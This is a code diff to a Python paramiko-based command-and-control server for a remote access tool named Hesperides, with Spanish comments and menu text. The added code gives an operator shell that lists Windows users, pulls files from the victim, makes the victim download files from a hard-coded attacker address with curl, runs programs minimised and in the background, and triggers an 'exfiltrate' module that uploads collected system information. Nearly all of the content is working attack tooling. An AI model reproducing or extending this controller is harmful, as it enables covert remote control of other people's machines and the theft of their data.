@@ -1,7 +1,65 @@
+
+
 import paramiko
 import os
 import socket
-class SSHServer (paramiko.ServerInterface):
+
+
+
+print("""
+      
+      , 
+      .@, 
+     .@a@a,. 
+     S@@ss@@@@a,. 
+    sS@@@ss@@@@@Ss,  , 
+ , SSSSS@@@ss@@@SSSs @, 
+ @sSSSSSSSS@@ss@SSSSs@@s, , 
+ `@@@@@SSSSSSSSssSSS@@@@@sSs, 
+   @@@@@@@@@@@@@@ss@@@@@@@@SSs , 
+ , `@@@@@@@@@@@@@@ss@@@@@@@SSSs@, 
+  SsSSSS@@@@@@@@@@@ss@@@@@@SSSSS@, 
+  `SSSSSSSSS@@@@@@@@@ss@@@@SSSSS@@ 
+   `SSSSSSSSSSSS@@@@@@ss@@SSSSSS@@',''', 
+   , `SSSSSSSSSSSSSSS@@ss@SSSSS@@@;%,.,,` 
+    @aSSSSSSSSSSSSSSSSSSssSSSS@@@@;%;%%' 
+     `@@@@@@@SSSSSSSSSSSSssSSS@@@@;%;%' 
+        `@@@@@@@@@@@@@@@SSSssS@@@@;%;% 
+           `@@@@@@@@@@@@@@@@@ss@@@;%;%    ...,,,,,,,,,,.. 
+               `@@@@@@@@@@@@@@@ssS;%;%  .;;%%;%%;%%%;%%;%%%,. 
+         .,::;;;;;;;;`SSSSSSSSSSSss;%%,::;%;%%%%%%%;%%%%%%;%%%%,. 
+      .:::;;;;;%;;;;;;;,;;,;;,;;,::,.,::;%%%%%;%%%%%%%%%%%%%%%;%%%;, 
+    .:::;;;%;;;;;%;%;%;%;%;%;%%%%;%%%%%;%%%%%%%%%%;%%%%%;%%%%%%%%;%%;. 
+   :::;%;;;;%;;%;;;%;%;;%%%;%%%%%%%;%%%%%%%;%%%%%%%%%x%x%%%%%%%%;%%;%;, 
+  :::;;;;;%;;%;;;%;;%;%%%%%%%%;%%%%%%%%%%%%%%%%%%%%%%%x%x%%%%%%%%%%%;%;, 
+ :::;;;;;%;;;;;;%;%%;%xx%;%%%%%%%;%%%%%%%x%%%%%%%%%%%%%x%x%x%%%%%%%;%;%; 
+,:::;%;;%;;;%;%;;%;%%x%;%%%%%%%%%%%%%x%x%%x%%%%%%%%%%%%%x%%x%x%%%%%%;%%;, 
+:::;;;;%;;%;;%;;%%%;x%x%%%;%%%%%%%%%%%%%x%%x%%%%%%%%%%%xx%x%x%%%%%%%%;;%; 
+:::%;;;;;%;;%;;%%;%%;%;%%%%%%%%%%%%;%%x%%x%%x%;%%%%%%%%%x%x%%%%%%%%%;%;%; 
+:::;;;%;;;;%;%;%;%%;%%%%%%%;%%%%%%%%%%%x%%x%%%%%%%%%%%%x%x%%x%%%%%%;%;%%; 
+`:::;;;;%;%;%;%;%%;%%;%%%%%%%%%%%%%%%%%%%x%x%%%%%%%%%%xx%x%%%%%%%%%;%;%;' 
+ `:::;;%;%;;%;;%%;%%;%;%%;%%%%%;%%%%%%%%%%%%%%%%%%;%%%%x%%%%%%%%%;%%;%;' 
+  `:::;;;;;%;;%%;%%;%%%%%%%;%%%%%%%%%%;%%%%%%%%;%%%%%;%%%%%%%%%;%%;%%;' 
+   `:::;;%;;;%;;;%%%;%%;%%%%%%%%%%;%%%%%%%%%%;%%%%%%%%%%%%%%;%;%;%%%;' 
+     `:::;;%;;;%%;%;%;%%;%;%%%%%%%%%%%%%%%%%%%%%%;%%;%%%%;%%%;%;%;%;' 
+       `:::;;;%;;%;;%%;%;%%%%%%%%%%%%%%%%%%;%%%%%%%%%%%;%%%;%%;%%;' 
+         `:::;;;%;;%;%;%%%%;%%%%%%;%%%%%%%%%%%%;%%%;%%;%%;%%;%%;' 
+           `:::;;%;;%;;%;%%%%%%;%%%%%%%%%%%%;%%%%%%%%%%%;%;%%;' 
+             `:::;%;;;%;;%;%x%%%%%;%%%%%%%%x%%%%%%;%%%;%%;%;' 
+               `:::;;;%;%;;%;x%x%x%%x%;%x%x%%%%;%%%%%;%;%;' 
+                 `:::%;%;;%:%:,xx%%x%%x%xx,:%%%%;%%;%%%;' 
+                   `:::%;;;;:%:`xx%x%xx%x':%%%;%%%%%%;' 
+                    `:::;;%;;%:,`%x%xx%x',:%;%%%%;%%;' 
+                      `:::;;;;;:::'   `:::;;;;;;:::'
+
+  _   _ _____ ____  ____  _____ ____  ___ ____  _____ ____  
+ | | | | ____/ ___||  _ \| ____|  _ \|_ _|  _ \| ____/ ___| 
+ | |_| |  _| \___ \| |_) |  _| | |_) || || | | |  _| \___ \ 
+ |  _  | |___ ___) |  __/| |___|  _ < | || |_| | |___ ___) |
+ |_| |_|_____|____/|_|   |_____|_| \_\___|____/|_____|____/ 
+                                                            
+        """)
+class SSHServer(paramiko.ServerInterface):
     def check_channel_request(self, kind, chanid):
         #metodo de conexion basico
         if kind == "session":
@@ -43,40 +101,68 @@ def main():
         print("Error de transporte o sesion")
         quit()
     print(chan) #para ver si que error saca
-    success_msg = chan.recv(1024).decode()
+    success_msg = chan.recv(40960).decode()
     print(f"{success_msg}")
     chan.send(" ")
     def comm_handler():
         try:
             while True:
-                cmd_line = ("Shell%> ")
+                cmd_line = ("Shell%>")
                 command = input(cmd_line + "")
                 #args = command.split()
+                if command == "help":
+                    print("""
+Menu de Hesperides:
+get_file: Lanzando el comando get_file seguido de un archivo ubicado en el directorio del cliente, se envia al servidor\n
+send_file: Lanzando el comando send_file seguido de un archivo ubicado en el directorio del servidor, se envia al cliente\n
+exec: Lanzando el comando exec seguido de un archivo ubicado en el directorio, se ejecuta dicho archivo\n
+get_users: Lista los usuarios del sistema\n
+exfiltrate: Lanza el modulo de recopilacion de informacion y copia el archivo info.txt en el directorio del servidor\n
+                        """)
+                    continue
                 if command == "get_users":
                     command = ("wmic useraccount list brief")
                     chan.send(command)
                     #respuesta
-                    ret_value = chan.recv(8192)
+                    ret_value = chan.recv(40960)
                     print(ret_value.decode())
                     continue
-                if command == "get_file":
+                #envio de archivo desde el cliente al servidor
+                if command.split(" ")[0] == "get_file":
                     chan.send(command)
-                    filetodown = open("texto.txt", "wb")
-                    ret_value = chan.recv(8192)
+                    archivo = command.split(" ")[1]
+                    filetodown = open(archivo, "wb")
+                    ret_value = chan.recv(40960)
                     filetodown.write(ret_value)
                     filetodown.close()
                     print(ret_value.decode())
+                    
+                #envio de archivo desde el servidor al cliente
+                if command.split(" ")[0] == "send_file":
+                    archivo = command.split(" ")[1]
+                    command = (f"curl -O http://192.168.0.13:8080/{archivo}")
+                    chan.send(command)
+                    #respuesta
+                    ret_value = chan.recv(40960)
+                    print(ret_value.decode())
+                    
+                #activacion del modulo de exfiltracion de informacion + subida
+                if command == "exfiltrate":
+                    chan.send(command)
+                    
+                #ejecucion de comandos de forma remota
                 if command.split(" ")[0] == "exec":
                     ejecutable = command.split(" ")[1]
                     ejecucion = "start /MIN /B " + ejecutable
                     chan.send(ejecucion)
-                    ret_value = chan.recv(8192)
+                    ret_value = chan.recv(40960)
                     print(ret_value.decode())
+                    
                 if command == "":
                     continue            
                 else:
                         chan.send(command)
-                        ret_value = chan.recv(8192)
+                        ret_value = chan.recv(40960)
                         print(ret_value.decode())
                         continue
         except Exception as e:
